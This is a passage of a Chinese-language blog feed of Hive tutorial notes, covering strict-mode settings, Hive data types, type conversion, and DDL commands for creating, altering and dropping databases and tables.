将hive.strict.checks.no.partition.filter设置为true时，对于分区表，除非where语句中含有分区字段过滤条件来限制范围，否则不允许执行。换句话说，就是用户不允许扫描所有分区。进行这个限制的原因是，通常分区表都拥有非常大的数据集，而且数据增加迅速。没有进行分区限制的查询可能会消耗令人不可接受的巨大资源来处理这个表。<br> 2）使用order by没有limit过滤</p><p> 将hive.strict.checks.orderby.no.limit设置为true时，对于使用了order by语句的查询，要求必须使用limit语句。因为order by为了执行排序过程会将所有的结果数据分发到同一个Reducer中进行处理，强制要求用户增加这个LIMIT语句可以防止Reducer额外执行很长一段时间。</p><p>3）笛卡尔积</p><p> 将hive.strict.checks.cartesian.product设置为true时，会限制笛卡尔积的查询。对关系型数据库非常了解的用户可能期望在 执行JOIN查询的时候不使用ON语句而是使用where语句，这样关系数据库的执行优化器就可以高效地将WHERE语句转化成那个ON语句。不幸的是，Hive并不会执行这种优化，因此，如果表足够大，那么这个查询就会出现不可控的情况。</p><h1 id="8-压缩"><a href="#8-压缩" class="headerlink" title="8 压缩"></a>8 压缩</h1><p>在实际的项目开发当中，hive表的数据存储格式一般选择：orc或parquet。压缩方式一般选择snappy，lzo。</p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hive/">Hive</category>
      
      
      <comments>https://m01ly.github.io/2020/11/15/bigdata-hive4-optimize/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hive学习笔记（二） Hive对数据基本操作</title>
      <link>https://m01ly.github.io/2020/11/15/bigdata-hive2/</link>
      <guid>https://m01ly.github.io/2020/11/15/bigdata-hive2/</guid>
      <pubDate>Sun, 15 Nov 2020 07:45:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>下面我们通过Hive对数据进行操作，主要包括对数据库，表的基本操作和基本函数的使用。</p><h1 id="1-Hive数据类型"><a href="#1-Hive数据类型" class="headerlink" title="1   Hive数据类型"></a>1   Hive数据类型</h1><h2 id="1-1-基本数据类型"><a href="#1-1-基本数据类型" class="headerlink" title="1.1 基本数据类型"></a>1.1 基本数据类型</h2><table><thead><tr><th>Hive数据类型</th><th>Java数据类型</th><th>长度</th><th>例子</th></tr></thead><tbody><tr><td>TINYINT</td><td>byte</td><td>1byte有符号整数</td><td>20</td></tr><tr><td>SMALINT</td><td>short</td><td>2byte有符号整数</td><td>20</td></tr><tr><td>INT</td><td>int</td><td>4byte有符号整数</td><td>20</td></tr><tr><td>BIGINT</td><td>long</td><td>8byte有符号整数</td><td>20</td></tr><tr><td>BOOLEAN</td><td>boolean</td><td>布尔类型，true或者false</td><td>TRUE FALSE</td></tr><tr><td>FLOAT</td><td>float</td><td>单精度浮点数</td><td>3.14159</td></tr><tr><td>DOUBLE</td><td>double</td><td>双精度浮点数</td><td>3.14159</td></tr><tr><td>STRING</td><td>string</td><td>字符系列。可以指定字符集。可以使用单引号或者双引号。</td><td>‘now is the time’  “for all  good men”</td></tr><tr><td>TIMESTAMP</td><td></td><td>时间类型</td><td></td></tr><tr><td>BINARY</td><td></td><td>字节数组</td><td></td></tr></tbody></table><p>对于Hive的String类型相当于数据库的varchar类型，该类型是一个可变的字符串，不过它不能声明其中最多能存储多少个字符，理论上它可以存储2GB的字符数。</p><h2 id="1-2-集合数据类型"><a href="#1-2-集合数据类型" class="headerlink" title="1.2 集合数据类型"></a>1.2 集合数据类型</h2><table><thead><tr><th>数据类型</th><th>描述</th><th>语法示例</th></tr></thead><tbody><tr><td>STRUCT</td><td>和c语言中的struct类似，都可以通过“点”符号访问元素内容。例如，如果某个列的数据类型是STRUCT{first STRING, last STRING},那么第1个元素可以通过字段.first来引用。</td><td>struct()  例如struct&lt;street:string,  city:string&gt;</td></tr><tr><td>MAP</td><td>MAP是一组键-值对元组集合，使用数组表示法可以访问数据。例如，如果某个列的数据类型是MAP，其中键-&gt;值对是’first’-&gt;’John’和’last’-&gt;’Doe’，那么可以通过字段名[‘last’]获取最后一个元素</td><td>map()  例如map&lt;string,  int&gt;</td></tr><tr><td>ARRAY</td><td>数组是一组具有相同类型和名称的变量的集合。这些变量称为数组的元素，每个数组元素都有一个编号，编号从零开始。例如，数组值为[‘John’, ‘Doe’]，那么第2个元素可以通过数组名[1]进行引用。</td><td>Array()  例如array<string></string></td></tr></tbody></table><p>Hive有三种复杂数据类型ARRAY、MAP 和 STRUCT。ARRAY和MAP与Java中的Array和Map类似，而STRUCT与C语言中的Struct类似，它封装了一个命名字段集合，复杂数据类型允许任意层次的嵌套。</p><p>1）案例实操</p><p>（1）假设某表有如下一行，我们用JSON格式来表示其数据结构。在Hive下访问的格式为</p><pre class="line-numbers language-json"><code class="language-json">&amp;#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"songsong"</span><span class="token punctuation">,</span>  <span class="token property">"friends"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"bingbing"</span> <span class="token punctuation">,</span> <span class="token string">"lili"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span>    //列表Array<span class="token punctuation">,</span>   <span class="token property">"children"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>           //键值Map<span class="token punctuation">,</span>​    <span class="token property">"xiao song"</span><span class="token operator">:</span> <span class="token number">19</span> <span class="token punctuation">,</span>​    <span class="token property">"xiaoxiao song"</span><span class="token operator">:</span> <span class="token number">18</span>  &amp;#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token property">"address"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>           //结构Struct<span class="token punctuation">,</span>​    <span class="token property">"street"</span><span class="token operator">:</span> <span class="token string">"hui long guan"</span> <span class="token punctuation">,</span>​    <span class="token property">"city"</span><span class="token operator">:</span> <span class="token string">"beijing"</span>   &amp;#<span class="token number">125</span><span class="token punctuation">;</span>&amp;#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）基于上述数据结构，我们在Hive里创建对应的表，并导入数据。 </p><p>创建本地测试文件test.txt</p><p>songsong,bingbing_lili,xiao song:18_xiaoxiao song:19,hui long guan_beijing</p><p>yangyang,caicai_susu,xiao yang:18_xiaoxiao yang:19,chao yang_beijing</p><p>注意：MAP，STRUCT和ARRAY里的元素间关系都可以用同一个字符表示，这里用“_”。</p><p>（3）Hive上创建测试表test</p><pre class="line-numbers language-bash"><code class="language-bash">create table test<span class="token punctuation">(</span>name string,friends array<span class="token operator">&lt;</span>string<span class="token operator">></span>,children map<span class="token operator">&lt;</span>string, int<span class="token operator">></span>,address struct<span class="token operator">&lt;</span>street:string, city:string<span class="token operator">></span><span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">','</span>collection items terminated by <span class="token string">'_'</span>map keys terminated by <span class="token string">':'</span>lines terminated by <span class="token string">'\n'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>字段解释：</p><p>row format delimited fields terminated by ‘,’ – 列分隔符</p><p>collection items terminated by ‘_’    –MAP STRUCT 和 ARRAY 的分隔符(数据分割符号)</p><p>map keys terminated by ‘:’           – MAP中的key与value的分隔符</p><p>lines terminated by ‘\n’;             – 行分隔符</p><p>（4）导入文本数据到测试表</p><p>load data local inpath ‘/opt/module/hive/datas/test.txt’ into table test; </p><p>（5）访问三种集合列里的数据，以下分别是ARRAY，MAP，STRUCT的访问方式</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> friends<span class="token punctuation">[</span>1<span class="token punctuation">]</span>,children<span class="token punctuation">[</span><span class="token string">'xiao song'</span><span class="token punctuation">]</span>,address.city from <span class="token function">test</span>where name<span class="token operator">=</span><span class="token string">"songsong"</span><span class="token punctuation">;</span>OK_c0   _c1   citylili  18   beijingTime taken: 0.076 seconds, Fetched: 1 row<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-3-类型转化"><a href="#1-3-类型转化" class="headerlink" title="1.3 类型转化"></a>1.3 类型转化</h2><p>Hive的原子数据类型是可以进行隐式转换的，类似于Java的类型转换，例如某表达式使用INT类型，TINYINT会自动转换为INT类型，但是Hive不会进行反向转化，例如，某表达式使用TINYINT类型，INT不会自动转换为TINYINT类型，它会返回错误，除非使用CAST操作。</p><p>1）隐式类型转换规则如下</p><p>（1）任何整数类型都可以隐式地转换为一个范围更广的类型，如TINYINT可以转换成INT，INT可以转换成BIGINT。</p><p>（2）所有整数类型、FLOAT和STRING类型都可以隐式地转换成DOUBLE。</p><p>（3）TINYINT、SMALLINT、INT都可以转换为FLOAT。</p><p>（4）BOOLEAN类型不可以转换为任何其它的类型。</p><p>2）可以使用CAST操作显示进行数据类型转换</p><p>例如CAST(‘1’ AS INT)将把字符串’1’ 转换成整数1；如果强制类型转换失败，如执行CAST(‘X’ AS INT)，表达式返回空值 NULL。</p><pre class="line-numbers language-bash"><code class="language-bash">0: jdbc:hive2://hadoop102:10000<span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">'1'</span>+2, cast<span class="token punctuation">(</span><span class="token string">'1'</span>as int<span class="token punctuation">)</span> + 2<span class="token punctuation">;</span>+------+------+--+<span class="token operator">|</span> _c0 <span class="token operator">|</span> _c1 <span class="token operator">|</span>+------+------+--+<span class="token operator">|</span> 3.0 <span class="token operator">|</span> 3  <span class="token operator">|</span>+------+------+--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2 DDL数据定义</p><h1 id="2-DDL数据定义"><a href="#2-DDL数据定义" class="headerlink" title="2 DDL数据定义"></a>2 DDL数据定义</h1><p>数据库模式定义语言DDL(Data Definition Language)，是用于描述数据库中要存储的现实世界实体的语言。具体其实就是对数据库和表的CRUD操作。</p><h2 id="2-1-创建数据库"><a href="#2-1-创建数据库" class="headerlink" title="2.1 创建数据库"></a>2.1 创建数据库</h2><p>创建数据库语法如下所示：</p><pre class="line-numbers language-bash"><code class="language-bash">CREATE DATABASE <span class="token punctuation">[</span>IF NOT EXISTS<span class="token punctuation">]</span> database_name  --数据库名称<span class="token punctuation">[</span>COMMENT database_comment<span class="token punctuation">]</span>  --数据库备注<span class="token punctuation">[</span>LOCATION hdfs_path<span class="token punctuation">]</span>  ---数据库存储位置<span class="token punctuation">[</span>WITH DBPROPERTIES <span class="token punctuation">(</span>property_name<span class="token operator">=</span>property_value, <span class="token punctuation">..</span>.<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span> --DB的一些属性<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>1）创建一个数据库，数据库在HDFS上的默认存储路径是/user/hive/warehouse/*.db。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create datavase mydb<span class="token punctuation">;</span>create table <span class="token keyword">if</span> not exists test1<span class="token punctuation">(</span> <span class="token function">id</span> int comment <span class="token string">"this is id"</span>, name string comment <span class="token string">"this is name"</span><span class="token punctuation">)</span>comment <span class="token string">"this is table"</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">','</span>STORED as textfileTBLPROPERTIES<span class="token punctuation">(</span><span class="token string">"createtime="</span> 2020-4-11"<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以在hdfs上看到创建的数据库目录。</p><p><img src="/2020/11/15/bigdata-hive2/1636962952895.png" alt="1636962952898"></p><p>2）避免要创建的数据库已经存在错误，增加if not exists判断。（标准写法）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create database db_hive<span class="token punctuation">;</span>FAILED: Execution Error, <span class="token keyword">return</span> code 1 from org.apache.hadoop.hive.ql.exec.DDLTask. Database db_hive already existshive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create database <span class="token keyword">if</span> not exists db_hive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3）创建一个数据库，指定数据库在HDFS上存放的位置</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create database db_hive2 location <span class="token string">'/db_hive2.db'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-2-查询数据库"><a href="#2-2-查询数据库" class="headerlink" title="2.2 查询数据库"></a>2.2 查询数据库</h2><p>1）显示数据库</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> show databases<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）显示数据库信息</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> desc database db_hive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）显示数据库详细信息，extended</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> desc database extended db_hive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）切换当前数据库</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> use db_hive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-3-修改数据库"><a href="#2-3-修改数据库" class="headerlink" title="2.3 修改数据库"></a>2.3 修改数据库</h2><p>用户可以使用ALTER DATABASE命令为某个数据库的DBPROPERTIES设置键-值对属性值，来描述这个数据库的属性信息。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter database db_hive <span class="token keyword">set</span> dbproperties<span class="token punctuation">(</span><span class="token string">'createtime'</span><span class="token operator">=</span><span class="token string">'20170830'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在hive中查看修改结果</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> desc database extended db_hive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-4-删除数据库"><a href="#2-4-删除数据库" class="headerlink" title="2.4 删除数据库"></a>2.4 删除数据库</h2><p>1）删除空数据库</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span>drop database db_hive2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）如果删除的数据库不存在，最好采用 if exists判断数据库是否存在</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> drop database db_hive<span class="token punctuation">;</span>FAILED: SemanticException <span class="token punctuation">[</span>Error 10072<span class="token punctuation">]</span>: Database does not exist: db_hivehive<span class="token operator">></span> drop database <span class="token keyword">if</span> exists db_hive2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3）如果数据库不为空，可以采用cascade命令，强制删除</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> drop database db_hive<span class="token punctuation">;</span>FAILED: Execution Error, <span class="token keyword">return</span> code 1 from org.apache.hadoop.hive.ql.exec.DDLTask. InvalidOperationException<span class="token punctuation">(</span>message:Database db_hive is not empty. One or <span class="token function">more</span> tables exist.<span class="token punctuation">)</span>hive<span class="token operator">></span> drop database db_hive cascade<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2-5-创建表"><a href="#2-5-创建表" class="headerlink" title="2.5 创建表"></a>2.5 创建表</h2><p><strong>1）建表语法</strong></p><pre class="line-numbers language-bash"><code class="language-bash">CREATE <span class="token punctuation">[</span>EXTERNAL<span class="token punctuation">]</span> TABLE <span class="token punctuation">[</span>IF NOT EXISTS<span class="token punctuation">]</span> table_name -<span class="token punctuation">[</span><span class="token punctuation">(</span>col_name data_type <span class="token punctuation">[</span>COMMENT col_comment<span class="token punctuation">]</span>, <span class="token punctuation">..</span>.<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>COMMENT table_comment<span class="token punctuation">]</span> <span class="token punctuation">[</span>PARTITIONED BY <span class="token punctuation">(</span>col_name data_type <span class="token punctuation">[</span>COMMENT col_comment<span class="token punctuation">]</span>, <span class="token punctuation">..</span>.<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>CLUSTERED BY <span class="token punctuation">(</span>col_name, col_name, <span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token punctuation">[</span>SORTED BY <span class="token punctuation">(</span>col_name <span class="token punctuation">[</span>ASC<span class="token operator">|</span>DESC<span class="token punctuation">]</span>, <span class="token punctuation">..</span>.<span class="token punctuation">)</span><span class="token punctuation">]</span> INTO num_buckets BUCKETS<span class="token punctuation">]</span> <span class="token punctuation">[</span>ROW FORMAT row_format<span class="token punctuation">]</span> <span class="token punctuation">[</span>STORED AS file_format<span class="token punctuation">]</span> <span class="token punctuation">[</span>LOCATION hdfs_path<span class="token punctuation">]</span><span class="token punctuation">[</span>TBLPROPERTIES <span class="token punctuation">(</span>property_name<span class="token operator">=</span>property_value, <span class="token punctuation">..</span>.<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span>AS select_statement<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2）字段解释说明</strong> </p><p>（1）CREATE TABLE 创建一个指定名字的表。如果相同名字的表已经存在，则抛出异常；用户可以用 IF NOT EXISTS 选项来忽略这个异常。</p><p>（2）<strong>EXTERNAL 关键字可以让用户创建一个外部表</strong>，在建表的同时可以指定一个指向实际数据的路径（LOCATION），<strong>在删除表的时候，内部表的元数据和hdfs数据会被一起删除，而外部表只删除元数据，不删除存在hdfs上的数据。</strong></p><p>（3）COMMENT：为表和列添加注释。</p><p>（4）PARTITIONED BY创建分区表</p><p>（5）CLUSTERED BY创建分桶表</p><p>（6）SORTED BY不常用，对桶中的一个或多个列另外排序</p><p>（7）ROW FORMAT </p><p>DELIMITED [FIELDS TERMINATED BY char] [COLLECTION ITEMS TERMINATED BY char]</p><p>​    [MAP KEYS TERMINATED BY char] [LINES TERMINATED BY char] </p><p>  | SERDE serde_name [WITH SERDEPROPERTIES (property_name=property_value, property_name=property_value, …)]</p><p>用户在建表的时候可以自定义SerDe或者使用自带的SerDe。如果没有指定ROW FORMAT 或者ROW FORMAT DELIMITED，将会使用自带的SerDe。在建表的时候，用户还需要为表指定列，用户在指定表的列的同时也会指定自定义的SerDe，Hive通过SerDe确定表的具体的列的数据。</p><p>SerDe是Serialize/Deserilize的简称， hive使用Serde进行行对象的序列与反序列化。</p><p>（8）STORED AS指定存储文件类型</p><p>常用的存储文件类型：SEQUENCEFILE（二进制序列文件）、TEXTFILE（文本）、RCFILE（列式存储格式文件）</p><p>如果文件数据是纯文本，可以使用STORED AS TEXTFILE。如果数据需要压缩，使用 STORED AS SEQUENCEFILE。</p><p>（9）LOCATION ：指定表在HDFS上的存储位置。</p><p>（10）AS：后跟查询语句，根据查询结果创建表。</p><p>（11）LIKE允许用户复制现有的表结构，但是不复制数据。</p><h3 id="2-3-1-内部表-管理表"><a href="#2-3-1-内部表-管理表" class="headerlink" title="2.3.1 内部表(管理表)"></a>2.3.1 内部表(管理表)</h3><p>1）理论</p><p>默认创建的表都是所谓的管理表，有时也被称为内部表。因为这种表，Hive会（或多或少地）控制着数据的生命周期。Hive默认情况下会将这些表的数据存储在由配置项hive.metastore.warehouse.dir(例如，/user/hive/warehouse)所定义的目录的子目录下。  当我们删除一个管理表时，Hive也会删除这个表中数据。管理表不适合和其他工具共享数据。</p><p>（1）普通创建表</p><pre class="line-numbers language-bash"><code class="language-bash">create table <span class="token keyword">if</span> not exists student<span class="token punctuation">(</span><span class="token function">id</span> int, name string<span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span>stored as textfilelocation <span class="token string">'/user/hive/warehouse/student'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）根据查询结果创建表（查询的结果会添加到新创建的表中）</p><pre class="line-numbers language-bash"><code class="language-bash">create table <span class="token keyword">if</span> not exists student2 as <span class="token keyword">select</span> id, name from student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）根据已经存在的表结构创建表</p><pre class="line-numbers language-bash"><code class="language-bash">create table <span class="token keyword">if</span> not exists student3 like student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）查询表的类型</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> desc formatted student2<span class="token punctuation">;</span>Table Type:       MANAGED_TABLE <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-3-2-外部表"><a href="#2-3-2-外部表" class="headerlink" title="2.3.2 外部表"></a>2.3.2 外部表</h3><p>1）理论</p><p>因为表是外部表，所以Hive并非认为其完全拥有这份数据。删除该表并不会删除掉这份数据，不过描述表的元数据信息会被删除掉。</p><p>2）管理表和外部表的使用场景</p><p>每天将收集到的网站日志定期流入HDFS文本文件。在外部表（原始日志表）的基础上做大量的统计分析，用到的中间表、结果表使用内部表存储，数据通过SELECT+INSERT进入内部表。</p><p>3）案例实操</p><p>分别创建部门和员工外部表，并向表中导入数据。</p><p>（1）上传数据到HDFS</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -mkdir /student<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -put /opt/module/datas/student.txt /student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）建表语句，创建外部表</p><p>创建部门表</p><pre class="line-numbers language-bash"><code class="language-bash">create external table <span class="token keyword">if</span> not exists dept<span class="token punctuation">(</span>deptno int,dname string,loc int<span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）查看创建的表</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>show tables<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）查看表格式化数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> desc formatted dept<span class="token punctuation">;</span>Table Type:       EXTERNAL_TABLE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（5）删除外部表</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> drop table dept<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>外部表删除后，hdfs中的数据还在，但是metadata中dept的元数据已被删除</p><h3 id="2-5-3-管理表与外部表的互相转换"><a href="#2-5-3-管理表与外部表的互相转换" class="headerlink" title="2.5.3 管理表与外部表的互相转换"></a>2.5.3 管理表与外部表的互相转换</h3><p>（1）查询表的类型</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> desc formatted student2<span class="token punctuation">;</span>Table Type:       MANAGED_TABLE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）修改内部表student2为外部表</p><pre class="line-numbers language-bash"><code class="language-bash">alter table student2 <span class="token keyword">set</span> tblproperties<span class="token punctuation">(</span><span class="token string">'EXTERNAL'</span><span class="token operator">=</span><span class="token string">'TRUE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）修改外部表student2为内部表</p><pre class="line-numbers language-bash"><code class="language-bash">alter table student2 <span class="token keyword">set</span> tblproperties<span class="token punctuation">(</span><span class="token string">'EXTERNAL'</span><span class="token operator">=</span><span class="token string">'FALSE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：(‘EXTERNAL’=’TRUE’)和(‘EXTERNAL’=’FALSE’)为固定写法，区分大小写！</p><h2 id="2-6-修改表"><a href="#2-6-修改表" class="headerlink" title="2.6 修改表"></a>2.6 修改表</h2><h3 id="2-6-1-重命名表"><a href="#2-6-1-重命名表" class="headerlink" title="2.6.1 重命名表"></a>2.6.1 重命名表</h3><p>1）语法</p><pre class="line-numbers language-bash"><code class="language-bash">ALTER TABLE table_name RENAME TO new_table_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）实操案例</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept_partition2 <span class="token function">rename</span> to dept_partition3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-6-2-增加-修改-替换列信息"><a href="#2-6-2-增加-修改-替换列信息" class="headerlink" title="2.6.2 增加/修改/替换列信息"></a>2.6.2 增加/修改/替换列信息</h3><p>1）语法</p><p>（1）更新列</p><pre class="line-numbers language-bash"><code class="language-bash">ALTER TABLE table_name CHANGE <span class="token punctuation">[</span>COLUMN<span class="token punctuation">]</span> col_old_name col_new_name column_type <span class="token punctuation">[</span>COMMENT col_comment<span class="token punctuation">]</span> <span class="token punctuation">[</span>FIRST<span class="token operator">|</span>AFTER column_name<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）增加和替换列</p><pre class="line-numbers language-bash"><code class="language-bash">ALTER TABLE table_name ADD<span class="token operator">|</span>REPLACE COLUMNS <span class="token punctuation">(</span>col_name data_type <span class="token punctuation">[</span>COMMENT col_comment<span class="token punctuation">]</span>, <span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：ADD是代表新增一字段，字段位置在所有列后面(partition列前)，REPLACE则是表示替换表中所有字段。</p><p>2）实操案例</p><p>（1）查询表结构</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> desc dept<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）添加列</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept add columns<span class="token punctuation">(</span>deptdesc string<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）更新列</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept change column deptdesc desc string<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（5）替换列</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept replace columns<span class="token punctuation">(</span>deptno string, dname string, loc string<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2-7-删除表"><a href="#2-7-删除表" class="headerlink" title="2.7 删除表"></a>2.7 删除表</h2><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> drop table dept<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="3-DML数据操作"><a href="#3-DML数据操作" class="headerlink" title="3  DML数据操作"></a>3  DML数据操作</h1><h2 id="3-1-数据导入"><a href="#3-1-数据导入" class="headerlink" title="3.1 数据导入"></a>3.1 数据导入</h2><p>让hdfs的数据和hive表产生关联。上传表数据：hive创建的表其实就是hdfs中的一个目录，所以表数据就映射为hdfs目录下的数据txt。</p><h3 id="3-1-1-向表中装载数据（Load）"><a href="#3-1-1-向表中装载数据（Load）" class="headerlink" title="3.1.1 向表中装载数据（Load）"></a>3.1.1 